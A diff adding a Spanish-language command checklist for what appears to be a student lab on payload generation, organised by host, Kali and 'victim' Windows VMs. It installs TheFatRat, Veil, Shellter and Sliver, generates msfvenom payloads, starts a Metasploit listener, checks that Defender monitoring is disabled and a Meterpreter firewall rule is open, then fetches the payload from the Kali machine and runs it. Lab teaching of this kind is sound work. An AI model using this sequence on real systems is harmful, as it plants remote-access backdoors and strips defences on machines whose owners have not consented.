@@ -1,0 +1,205 @@
+=====================================================================
+  COMANDOS PARA COPIAR-PEGAR MANUALMENTE
+  Organizados por maquina. Toma captura DESPUES de cada bloque.
+=====================================================================
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│  🖥️  MAQUINA 1: WINDOWS HOST (tu PC)                            │
+│  Abre PowerShell como ADMINISTRADOR                              │
+└───────────────────────────────────────────────────────────────────┘
+
+--- BLOQUE 1: Ver estructura del laboratorio ---
+cd "C:\Users\Usuario\Documents\1 Semestre 2026\fatrat-lab"
+Get-ChildItem -Recurse | Select-Object Mode, Length, Name | Format-Table -AutoSize
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 2: Ver el LEEME ---
+Get-Content "00-LEEME-PRIMERO.txt"
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 3: Ver contenido del script de VirtualBox ---
+Get-Content "01-instalar-virtualbox.ps1" | Select-Object -First 30
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 4: Ver script de creacion de VM ---
+Get-Content "02-crear-vm-kali.ps1" | Select-Object -First 30
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 5: Ver docker-compose ---
+Get-Content "04-docker-compose.yml"
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 6: Ver Dockerfile ---
+Get-Content "Dockerfile.fatrat" | Select-Object -First 25
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 7: Ver script de victima Windows ---
+Get-Content "08-windows-victima-config.ps1" | Select-Object -First 30
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 8: Ver wrapper msfvenom ---
+Get-Content "scripts\msfvenom-plus"
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 9: Ver template listener ---
+Get-Content "scripts\listener.rc"
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 10: Ver auto-capturas script ---
+Get-Content "auto-capturas.ps1" | Select-Object -First 40
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 11: Ejecutar auto-capturas (OPCIONAL) ---
+.\auto-capturas.ps1
+📸 (toma capturas automaticamente)
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│  🐧  MAQUINA 2: KALI LINUX (VM)                                 │
+│  Abre terminal en Kali                                           │
+└───────────────────────────────────────────────────────────────────┘
+
+--- BLOQUE 12: Montar carpeta compartida y entrar ---
+sudo mkdir -p /mnt/fatrat-lab
+sudo mount -t vboxsf fatrat-lab /mnt/fatrat-lab
+cd /mnt/fatrat-lab
+ls -la
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 13: Ver contenido de los scripts .sh ---
+cat 03-dentro-kali-setup.sh | head -50
+📸 TOMA CAPTURA AQUI
+
+cat 06-alternativas-modernas.sh | head -40
+📸 TOMA CAPTURA AQUI
+
+cat 07-generar-payload-ejemplo.sh | head -40
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 14: EJECUTAR SETUP COMPLETO (15-20 min) ---
+sudo bash 03-dentro-kali-setup.sh
+📸 TOMA CAPTURA AL INICIO Y AL FINAL
+
+--- BLOQUE 15: Ver resumen ---
+cat /tmp/fatrat-lab/resumen-final.txt
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 16: Verificar herramientas ---
+echo "=== HERRAMIENTAS ==="
+msfvenom --version 2>&1 | head -1
+which veil || echo "Veil instalado"
+which shellter || echo "Shellter instalado"
+which sliver-server || echo "Sliver instalado"
+ls -la /opt/TheFatRat/
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 17: GENERAR PAYLOADS (DEMO) ---
+sudo bash 07-generar-payload-ejemplo.sh
+📸 TOMA CAPTURA AQUI (TODO EL OUTPUT)
+
+--- BLOQUE 18: Ver payloads generados ---
+ls -lh /output/
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 19: Iniciar listener Metasploit (abre otra terminal) ---
+msfconsole -q -r /mnt/fatrat-lab/scripts/listener.rc
+📸 TOMA CAPTURA DEL LISTENER CORRIENDO
+
+--- BLOQUE 20: Iniciar TheFatRat ---
+cd /opt/TheFatRat && sudo ./fatrat
+📸 TOMA CAPTURA DEL MENU PRINCIPAL
+(presiona Ctrl+C para salir)
+
+--- BLOQUE 21: Iniciar Veil ---
+veil
+📸 TOMA CAPTURA DEL MENU
+(escribe "exit" para salir)
+
+--- BLOQUE 22: Iniciar Sliver ---
+sliver-server
+📸 TOMA CAPTURA
+(Ctrl+C para salir)
+
+--- BLOQUE 23: Ver logs del setup ---
+cat /tmp/fatrat-lab/setup-kali-*.log | tail -30
+📸 TOMA CAPTURA AQUI
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│  🪟  MAQUINA 3: WINDOWS VICTIMA (VM)                            │
+│  Abre PowerShell como ADMINISTRADOR en la VM Victima             │
+└───────────────────────────────────────────────────────────────────┘
+
+--- BLOQUE 24: Montar carpeta compartida ---
+net use Z: \\VBOXSVR\fatrat-lab
+cd Z:\
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 25: Ver script de configuracion ---
+Get-Content "08-windows-victima-config.ps1" | Select-Object -First 25
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 26: EJECUTAR CONFIGURACION DE VICTIMA ---
+.\08-windows-victima-config.ps1
+📸 TOMA CAPTURA DEL PROCESO
+
+--- BLOQUE 27: Verificar configuracion ---
+Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring
+Get-NetFirewallRule -DisplayName "LAB-Meterpreter" | Select-Object DisplayName, Enabled, Direction
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 28: Copiar payload desde Kali ---
+# Alternativa 1: Si tienes SCP disponible
+scp kali@<IP_KALI>:/output/payload_windows.exe C:\payloads\
+
+# Alternativa 2: Desde carpeta compartida
+Copy-Item "Z:\output\payload_windows.exe" "C:\payloads\"
+
+# Alternativa 3: Descargar desde Kali con Python HTTP
+# En Kali: python3 -m http.server 8000
+# En Windows: Invoke-WebRequest -Uri "http://<IP_KALI>:8000/payload_windows.exe" -OutFile "C:\payloads\payload_windows.exe"
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 29: Verificar payload en victima ---
+Get-ChildItem C:\payloads\
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE 30: EJECUTAR PAYLOAD ---
+C:\payloads\payload_windows.exe
+📸 TOMA CAPTURA DEL RESULTADO
+
+
+┌───────────────────────────────────────────────────────────────────┐
+│  🐳  EXTRA: DOCKER (alternativa desde Windows)                   │
+│  En PowerShell (Admin) en Windows HOST                           │
+└───────────────────────────────────────────────────────────────────┘
+
+--- BLOQUE D1: Buildear imagen Docker ---
+cd "C:\Users\Usuario\Documents\1 Semestre 2026\fatrat-lab"
+docker build -f Dockerfile.fatrat -t fatrat .
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE D2: Iniciar contenedor ---
+docker run -it --rm -v ${PWD}/output:/output fatrat
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE D3: Setup dentro del contenedor ---
+# (DENTRO del contenedor)
+bash /scripts/05-docker-setup.sh
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE D4: Generar payload desde contenedor ---
+bash /scripts/07-generar-payload-ejemplo.sh
+📸 TOMA CAPTURA AQUI
+
+--- BLOQUE D5: Ver payloads en Windows ---
+# (EN OTRA TERMINAL POWERSHELL EN WINDOWS)
+Get-ChildItem "C:\Users\Usuario\Documents\1 Semestre 2026\fatrat-lab\output\"
+📸 TOMA CAPTURA AQUI
+
+
+=====================================================================
+  TOTAL: ~30 capturas (o ~35 con Docker)
+  Tiempo estimado: 30-45 min
+=====================================================================
